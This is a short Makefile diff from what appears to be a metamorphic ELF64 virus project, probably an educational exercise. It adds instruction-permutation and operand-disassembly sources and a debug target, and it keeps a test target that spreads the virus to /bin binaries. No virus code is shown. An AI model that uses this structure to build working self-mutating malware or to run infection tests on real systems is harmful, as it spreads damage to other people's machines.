@@ -17,6 +17,7 @@ SRC =	loader.s                       \
 	virus/copy_client_to_clone.c   \
 	virus/disasm_block.c           \
 	virus/disasm_jumps.c           \
+	virus/disasm_operands.c        \
 	virus/disasm_length.c          \
 	virus/elf64_iterators.c        \
 	virus/file_iterator.c          \
@@ -27,6 +28,7 @@ SRC =	loader.s                       \
 	virus/log.c                    \
 	virus/metamorph_clone.c        \
 	virus/permutate_blocks.c       \
+	virus/permutate_instructions.c \
 	virus/permutate_registers.c    \
 	virus/random.c                 \
 	virus/setup_virus_header.c     \
@@ -112,6 +114,9 @@ errors: fclean
 
 debug: fclean
 	${MAKE} all CFLAGS:="-DDEBUG -g" ASFLAGS:="-DDEBUG -g"
+
+debug_operands: fclean
+	${MAKE} all CFLAGS:="-DDEBUG_OPERANDS -g" ASFLAGS:="-DDEBUG_OPERANDS -g"
 
 test:
 	./scripts/test_spread.bash re 1000 /bin/ls /bin/sh /bin/pwd /bin/uname
